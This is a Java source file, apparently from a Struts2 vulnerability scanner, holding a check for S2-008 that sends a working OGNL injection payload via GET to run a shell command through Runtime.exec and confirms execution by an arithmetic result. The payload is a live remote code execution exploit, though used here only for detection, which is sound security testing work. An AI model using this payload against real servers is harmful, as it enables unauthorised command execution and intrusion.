package struts2scan.payload;

import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_008 implements Check {
    public String printInfo(){
        String info = "[+] S2-008:影响版本Struts 2.1.0-2.3.1; GET请求发送数据";
        return info+"\n";
    }

    @Override
    public boolean check(URL url) throws Exception {
        return false;
    }


    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception{

        int number1 = new Random(10000).nextInt(10000);
        int number2 = new Random(10000).nextInt(10000);
        String poc = "debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27expr%20"+number1+"%20%2B%20"+number2+"%27%29.getInputStream%28%29%29)";

        int numsum = number1+number2;
        if(path==null){
            path = "/index.action";
        }else if(!path.endsWith(".action")){
            path = path+"index.action";
        }

        String url = protocol+"://"+host+":"+port+path+"?"+poc;


        try {
            HttpResult result= HttpClient.get(url);;
            Pattern p = Pattern.compile(String.valueOf(numsum));
            Matcher m =p.matcher(result.getData());
            if(m.find()){
                return true;
            }else{
                return false;
            }
        }catch (Exception e){

            return false;
        }





        }



}
